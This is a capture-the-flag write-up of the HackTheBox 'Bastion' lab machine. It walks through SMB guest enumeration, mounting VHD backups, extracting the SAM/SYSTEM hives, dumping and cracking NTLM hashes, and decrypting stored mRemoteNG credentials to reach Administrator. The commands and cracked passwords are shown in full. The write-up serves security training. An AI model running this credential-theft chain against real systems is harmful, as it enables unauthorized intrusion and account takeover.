---
layout: post
title: HTB Bastion Writeup
date: 2026-03-29 17:41 -0400
categories: [Writeups, HackTheBox]
tags: [ctf, writeup]
---

## Initial Enumeration
We start off with a standard nmap scan
``` shell
sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP
```

``` shell
PORT     STATE SERVICE      REASON          VERSION
22/tcp   open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-29T23:41:44+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -41m03s, deviation: 1h09m14s, median: -1m05s
| smb2-time: 
|   date: 2026-03-29T21:41:42
|_  start_date: 2026-03-29T21:30:38
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40543/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42862/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44992/udp): CLEAN (Timeout)
|   Check 4 (port 59091/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Service Enumeration

### SMB

Let's first try some SMB enumeration with the Guest user:

**Share Enumeration**
``` shell
netexec smb $TARGETIP -u 'Guest' -p '' --shares
SMB         10.129.136.29   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.136.29   445    BASTION          [+] Bastion\Guest: 
SMB         10.129.136.29   445    BASTION          [*] Enumerated shares
SMB         10.129.136.29   445    BASTION          Share           Permissions     Remark
SMB         10.129.136.29   445    BASTION          -----           -----------     ------
SMB         10.129.136.29   445    BASTION          ADMIN$                          Remote Admin
SMB         10.129.136.29   445    BASTION          Backups         READ,WRITE      
SMB         10.129.136.29   445    BASTION          C$                              Default share
SMB         10.129.136.29   445    BASTION          IPC$            READ            Remote IPC
```

Since Guest is enabled, we can also gather the users on the machine:
**RID Bruteforce - User Enumeration**
``` shell
netexec smb $TARGETIP -u 'Guest' -p '' --rid-brute
SMB         10.129.136.29   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.136.29   445    BASTION          [+] Bastion\Guest: 
SMB         10.129.136.29   445    BASTION          500: BASTION\Administrator (SidTypeUser)
SMB         10.129.136.29   445    BASTION          501: BASTION\Guest (SidTypeUser)
SMB         10.129.136.29   445    BASTION          503: BASTION\DefaultAccount (SidTypeUser)
SMB         10.129.136.29   445    BASTION          513: BASTION\None (SidTypeGroup)
SMB         10.129.136.29   445    BASTION          1002: BASTION\L4mpje (SidTypeUser)
```

Let's take a deeper look into the readable folder
#### SMB Share Listing - smbclient
``` shell
smbclient //$TARGETIP/Backups -U 'Guest'              
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sun Mar 29 17:41:56 2026
  ..                                  D        0  Sun Mar 29 17:41:56 2026
  DGFHUjXtkL                          D        0  Sun Mar 29 17:41:56 2026
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
  WkRMePFbKZ.txt                      A        0  Sun Mar 29 17:41:56 2026

\DGFHUjXtkL
  .                                   D        0  Sun Mar 29 17:41:56 2026
  ..                                  D        0  Sun Mar 29 17:41:56 2026

\WindowsImageBackup
  .                                  Dn        0  Fri Feb 22 07:44:02 2019
  ..                                 Dn        0  Fri Feb 22 07:44:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 07:45:32 2019

\WindowsImageBackup\L4mpje-PC
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 07:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 07:45:32 2019
  MediaId                            An       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 07:45:32 2019

\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:02 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:44:03 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 07:45:32 2019

\WindowsImageBackup\L4mpje-PC\Catalog
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  BackupGlobalCatalog                An     5698  Fri Feb 22 07:44:02 2019
  GlobalCatalog                      An     7440  Fri Feb 22 07:45:32 2019

\WindowsImageBackup\L4mpje-PC\SPPMetadataCache
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  {cd113385-65ff-4ea2-8ced-5630f6feca8f}     An    57848  Fri Feb 22 07:45:32 2019

                5638911 blocks of size 4096. 1178038 blocks available
```

## SAM / SYSTEM extraction
There appears to be two vhd files, we can download them and mount them to inspect the file system. This is first attempted with the smaller size vhd. We will use the **guestmount** tool to perform this, as well as leveraging the **guestfs-tools** suite to inspect available filesystems:
``` shell
sudo apt install guestmount guestfs-tools -y
```

We will then create the mount point:
``` shell
sudo mkdir /mnt/vhd_mount
```

And inspect the available filesystems:
``` shell
virt-filesystems -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --all --long
Name      Type       VFS  Label           MBR Size      Parent
/dev/sda1 filesystem ntfs System Reserved -   104853504 -
/dev/sda1 partition  -    -               07  104857600 /dev/sda
/dev/sda  device     -    -               -   104970240 -
```

Knowing the name of the filesystem, we can now mount it to our folder:
``` shell
sudo guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd_mount -m /dev/sda1
```

Navigating to the mount point (*/mnt/vhd_mount*), we can inspect the files:
``` shell
sudo ls -lah /mnt/vhd_mount                                                                    
total 400K
drwxrwxrwx 1 root root 4.0K Feb 22  2019  .
drwxr-xr-x 3 root root 4.0K Mar 29 17:59  ..
drwxrwxrwx 1 root root 4.0K Feb 22  2019  Boot
-rwxrwxrwx 1 root root 375K Nov 20  2010  bootmgr
-rwxrwxrwx 1 root root 8.0K Feb 22  2019  BOOTSECT.BAK
drwxrwxrwx 1 root root 4.0K Feb 22  2019 'System Volume Information'
```

This appears to be the boot partition of the Windows operating system. We can now download the other vhd which is much larger (5418299392 bytes = 5.4 GB), which will take some time. We will first unmount the drive:
``` shell
sudo guestunmount /mnt/vhd_mount
```

And we can proceed with mounting the second vhd file after it finishes downloading:
``` shell
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd_mount -m /dev/sda1
```

Let's confirm our assumption that this is the main Windows partition :
``` shell
sudo ls -la /mnt/vhd_mount

total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 3 root root       4096 Mar 29 17:59  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```

We can now extract the SAM and SYSTEM files to dump the NTLM hashes of the users on the machine:
``` shell
sudo cp /mnt/vhd_mount/Windows/System32/config/SAM SAM
sudo cp /mnt/vhd_mount/Windows/System32/config/SYSTEM SYSTEM
```

We will then use the **impacket-secretsdump** tool to perform the extraction:
``` shell
sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL                                                                                                                                                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

The Administrator and Guest user hashes appear to be the same, putting these into **hashcat** with mode 1000, we can verify it returns as *blank*.
``` shell
hashcat -m 1000 '31d6cfe0d16ae931b73c59d7e0c089c0' /usr/share/wordlists/rockyou.txt

31d6cfe0d16ae931b73c59d7e0c089c0:   
```

Testing access with **netexec**, it looks like the Administrator user has since changed the password:
``` shell
netexec smb $TARGETIP -u Administrator -p '' --shares   
SMB         10.129.136.29   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.136.29   445    BASTION          [-] Bastion\Administrator: STATUS_LOGON_FAILURE
```

We can move onto cracking the user hash, since a path straight to Administrator is not possible:
``` shell
hashcat -m 1000 '26112010952d963c8dc4217daec986d9' /usr/share/wordlists/rockyou.txt

26112010952d963c8dc4217daec986d9:bureaulampje
```

We can verify these credentials by attempting to log in with SMB:
``` shell
netexec smb $TARGETIP -u L4mpje -p 'bureaulampje'
SMB         10.129.136.29   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.136.29   445    BASTION          [+] Bastion\L4mpje:bureaulampje
```

However, attempting to access with WinRM is unsuccessful:
``` shell
netexec winrm $TARGETIP -u L4mpje -p 'bureaulampje'         
WINRM       10.129.136.29   5985   BASTION          [*] Windows 10 / Server 2016 Build 14393 (name:BASTION) (domain:Bastion) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.136.29   5985   BASTION          [-] Bastion\L4mpje:bureaulampje
```

We do have port 22 (SSH) open on this machine, so that may give us a foothold:
``` shell
ssh L4mpje@$TARGETIP
```

We are able to login!
```
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

l4mpje@BASTION C:\Users\L4mpje>
```

## SSH Access Enumeration
Now with a foothold on the system, we can get the **user.txt** flag from the user's desktop:
```
l4mpje@BASTION C:\Users\L4mpje>cd Desktop                                                                                       

l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                                                      
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\Users\L4mpje\Desktop                                                                                           

22-02-2019  16:27    <DIR>          .                                                                                           
22-02-2019  16:27    <DIR>          ..                                                                                          
29-03-2026  23:31                34 user.txt                                                                                    
               1 File(s)             34 bytes                                                                                   
               2 Dir(s)   4.812.042.240 bytes free
```

Looking at the installed programs, we can see mRemoteNG is installed. Looking at the changelog file, we can see the current version:
``` shell
PS C:\Program Files (x86)\mRemoteNG> cat .\Changelog.txt                                                                                                                                                                                                                                 
1.76.11 (2018-10-18): 
```

Looking up this version, we discover that the application stores credentials even if the user has not logged in yet. The version is also vulnerable to another exploit (CVE-2023-30367), but it requires creating a memory dump of the application to extract the password in plaintext: https://nvd.nist.gov/vuln/detail/CVE-2023-30367 

Versions before 1.7.4 store passwords in an insecure format, with a hardcoded encryption key: https://www.errno.fr/mRemoteNG.html 

The password and connection information is stored in the `%APPDATA%\mRemoteNG\confCons.xml` folder: https://github.com/mRemoteNG/mRemoteNG/issues/1963 

A tool to decrypt the password can be found here: https://github.com/kmahyyg/mremoteng-decrypt 

With this knowledge in hand, we can gather the required information:
``` shell
PS C:\users\L4mpje> type .\AppData\Roaming\mRemoteNG\confCons.xml
```

```
----SNIPPET----
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
----SNIPPET----
```

We find the administrator password, which can now be decrypted with the tool mentioned earlier:
``` shell
git clone https://github.com/kmahyyg/mremoteng-decrypt && cd mremoteng-decrypt

python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

We can test the password retrieved with netexec:
``` shell
netexec smb $TARGETIP -u Administrator -p 'thXLHM96BeKL0ER2'  
SMB         10.129.136.29   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.136.29   445    BASTION          [+] Bastion\Administrator:thXLHM96BeKL0ER2 (Pwn3d
```

We can now gather the **root.txt** flag from the Administrator's desktop. Since the WinRM service is enabled on this box, we will use evil-winrm to log in:
``` shell
evil-winrm -i $TARGETIP -u Administrator -p 'thXLHM96BeKL0ER2'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/29/2026  11:31 PM             34 root.txt
```
